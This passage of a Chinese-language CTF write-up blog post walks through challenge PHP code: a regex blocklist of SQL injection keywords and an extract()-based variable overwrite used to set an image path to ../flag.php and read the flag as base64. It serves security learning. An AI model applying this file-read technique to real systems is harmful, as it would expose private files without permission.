class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>),<span class="literal">true</span>);</span><br><span class="line">        <span class="variable">$data</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$loginModel</span>-&gt;safe-&gt;<span class="title function_ invoke__">check</span>(<span class="variable">$data</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line">        <span class="variable">$password</span> = <span class="variable">$loginModel</span>-&gt;<span class="title function_ invoke__">getPassword</span>(<span class="variable">$data</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span> ( <span class="variable">$password</span> === <span class="variable">$data</span>[<span class="string">&#x27;password&#x27;</span>] ) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">loadView</span>(<span class="string">&quot;userInfo&quot;</span>, <span class="keyword">array</span>(<span class="string">&quot;msg&quot;</span>=&gt;<span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="string">&quot;200&quot;</span>,<span class="string">&quot;info&quot;</span>=&gt;<span class="string">&quot;login success!&quot;</span>)));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">loadView</span>(<span class="string">&quot;userInfo&quot;</span>, <span class="keyword">array</span>(<span class="string">&quot;msg&quot;</span>=&gt;<span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="string">&quot;202&quot;</span>,<span class="string">&quot;info&quot;</span>=&gt;<span class="string">&quot;error username or password.&quot;</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionOut</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">loadView</span>(<span class="string">&quot;userInfo&quot;</span>, <span class="keyword">array</span>(<span class="string">&quot;msg&quot;</span>=&gt;<span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="string">&quot;200&quot;</span>,<span class="string">&quot;info&quot;</span>=&gt;<span class="string">&quot;login out success!&quot;</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>safe.php:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Safe</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ( <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/select|information|insert|union|ascii|,|like|outfile|join|&lt;|&gt;|and|substr|#|or|\|\||sleep|benchmark|if|&amp;&amp;/is&#x27;</span>, <span class="variable">$data</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;test&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里是对关键词进行了替换，替换为了test。</p>
+<p>这里面都没有可利用的点，但是在view中的 UserIndex.php中看到:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$img_file</span>)) </span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$img_file</span> = <span class="string">&#x27;/../favicon.ico&#x27;</span>;      </span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$img_dir</span> = <span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>) . <span class="variable">$img_file</span>;</span><br><span class="line"><span class="variable">$img_base64</span> = <span class="title function_ invoke__">imgToBase64</span>(<span class="variable">$img_dir</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt; src=&quot;&#x27;</span> . <span class="variable">$img_base64</span> . <span class="string">&#x27;&quot;&gt;&#x27;</span>; <span class="comment">//图片形式展示</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">imgToBase64</span>(<span class="params"><span class="variable">$img_file</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$img_base64</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$img_file</span>)) </span><br><span class="line">  &#123;</span><br><span class="line">        <span class="variable">$app_img_file</span> = <span class="variable">$img_file</span>; <span class="comment">// 图片路径</span></span><br><span class="line">        <span class="variable">$img_info</span> = <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$app_img_file</span>); <span class="comment">// 取得图片的大小，类型等</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$app_img_file</span>, <span class="string">&quot;r&quot;</span>); <span class="comment">// 图片是否可读权限</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$fp</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$filesize</span> = <span class="title function_ invoke__">filesize</span>(<span class="variable">$app_img_file</span>);</span><br><span class="line">            <span class="variable">$content</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$fp</span>, <span class="variable">$filesize</span>);</span><br><span class="line">            <span class="variable">$file_content</span> = <span class="title function_ invoke__">chunk_split</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$content</span>)); <span class="comment">// base64编码</span></span><br><span class="line">            <span class="keyword">switch</span> (<span class="variable">$img_info</span>[<span class="number">2</span>]) </span><br><span class="line">            &#123;           <span class="comment">//判读图片类型</span></span><br><span class="line">                <span class="keyword">case</span> <span class="number">1</span>: <span class="variable">$img_type</span> = <span class="string">&quot;gif&quot;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">2</span>: <span class="variable">$img_type</span> = <span class="string">&quot;jpg&quot;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">3</span>: <span class="variable">$img_type</span> = <span class="string">&quot;png&quot;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">   <span class="variable">$img_base64</span> = <span class="string">&#x27;data:image/&#x27;</span> . <span class="variable">$img_type</span> . <span class="string">&#x27;;base64,&#x27;</span> . <span class="variable">$file_content</span>;<span class="comment">//合成图片的base64编码</span></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$img_base64</span>; <span class="comment">//返回图片的base64</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里可以看到有 把图片打到页面的功能，我们如果让 $img_file&#x3D;&#x2F;..&#x2F;flag.php ，就可以把flag.php 以base64形式写进来</p>
+<p>但是问题是怎么让$img_file 这个变量 为 flag.php 呢 </p>
+<p>UserController.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 用户控制器</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserController</span> <span class="keyword">extends</span> <span class="title">BaseController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="comment">// 访问列表</span></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionList</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="variable">$params</span> = <span class="variable">$_REQUEST</span>;</span><br><span class="line">		<span class="variable">$userModel</span> = <span class="keyword">new</span> <span class="title class_">UserModel</span>();</span><br><span class="line">		<span class="variable">$listData</span> = <span class="variable">$userModel</span>-&gt;<span class="title function_ invoke__">getPageList</span>(<span class="variable">$params</span>);</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">loadView</span>(<span class="string">&#x27;userList&#x27;</span>, <span class="variable">$listData</span> );</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionIndex</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$listData</span> = <span class="variable">$_REQUEST</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">loadView</span>(<span class="string">&#x27;userIndex&#x27;</span>,<span class="variable">$listData</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>UserController.php 会加载 userIndex 视图，然后 $listData 又是可控的，然后看到 loadview()函数的功能：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loadView</span>(<span class="params"><span class="variable">$viewName</span> =<span class="string">&#x27;&#x27;</span>, <span class="variable">$viewData</span> = []</span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;viewPath = BASE_PATH . <span class="string">&quot;/View/<span class="subst">&#123;$viewName&#125;</span>.php&quot;</span>;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;viewPath))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="title function_ invoke__">extract</span>(<span class="variable">$viewData</span>);</span><br><span class="line">			<span class="keyword">include</span> <span class="variable language_">$this</span>-&gt;viewPath;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p>有一个extract函数，这个可以起到变量覆盖的作用，这里的$viewData就是我们传进来的listData，是可控的，所以最后的payload：</p>
+<p><img src="https://i.loli.net/2020/10/06/DtU3ClhN7xqz4JB.png" alt="web.png"></p>
+<p>解密base64拿到Flag</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/writeup/" rel="tag"># writeup</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2020/10/05/NPUCTF2020%20ezinclude/" rel="prev" title="NPUCTF2020 ezinclude">
+                  <i class="fa fa-angle-left"></i> NPUCTF2020 ezinclude
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2020/10/06/GXYCTF2019/" rel="next" title="GXYCTF2019">
+                  GXYCTF2019 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">My0n9s</span>
+  </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
